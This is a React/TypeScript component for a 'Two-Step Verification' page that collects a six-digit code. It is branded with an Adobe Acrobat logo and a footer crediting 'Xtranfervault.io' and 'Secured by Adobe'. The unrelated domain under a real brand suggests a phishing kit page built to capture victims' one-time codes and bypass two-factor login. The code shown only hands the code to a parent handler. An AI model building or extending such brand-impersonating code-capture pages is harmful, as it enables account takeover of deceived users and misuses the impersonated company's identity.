import React, { useState } from 'react';
import Spinner from './common/Spinner';
import OtpInput from './common/OtpInput';
import { ShieldCheck } from 'lucide-react';

interface OtpPageProps {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  errorMessage?: string;
  email?: string;
}

const AdobeLogo = () => (
  <img 
    src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Adobe_Acrobat_Reader_icon_%282020%29.svg/640px-Adobe_Acrobat_Reader_icon_%282020%29.svg.png" 
    alt="Adobe Acrobat Reader Logo" 
    className="w-12 h-12 drop-shadow-lg"
  />
);

const OtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, email }) => {
  const [otp, setOtp] = useState('');

  const handleOtpComplete = (completedOtp: string) => {
    setOtp(completedOtp);
  };
  
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length === 6) {
      onSubmit(otp);
    }
  };

  return (
    <div 
      className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
      style={{
        backgroundImage: "url('https://images.unsplash.com/photo-1554147090-e1221a04a025?auto=format&fit=crop&w=2070&q=80')"
      }}
    >
      <div className="w-full max-w-md bg-black/40 backdrop-blur-2xl rounded-2xl shadow-2xl overflow-hidden border border-white/20">
        <div className="p-8">
          <div className="flex justify-center mb-6">
            <AdobeLogo />
          </div>
          <h1 className="text-2xl font-bold text-center text-white">Two-Step Verification</h1>
          <p className="text-center text-gray-300 mt-3 text-sm">
            For your security, please enter the 6-digit code sent to your authenticator app or phone.
          </p>

          <div className="mt-10">
            <form onSubmit={handleSubmit} className="space-y-8">
              {errorMessage && (
                <div className="bg-red-500/30 text-red-100 p-3 rounded-lg text-sm font-medium text-center border border-red-400/50">
                  {errorMessage}
                </div>
              )}

              <OtpInput length={6} onComplete={handleOtpComplete} disabled={isLoading} />

              <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full flex items-center justify-center py-3 px-4 rounded-lg font-bold text-white bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-lg shadow-blue-500/30">
                {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
                {isLoading ? 'Verifying...' : 'Verify Code'}
              </button>
            </form>
          </div>
        </div>
        <div className="bg-black/20 backdrop-blur-sm p-4 border-t border-white/10">
          <p className="text-xs text-gray-400 text-center">© 2026 Xtranfervault.io. Secured by Adobe®.</p>
        </div>
      </div>
    </div>
  );
};

export default OtpPage;
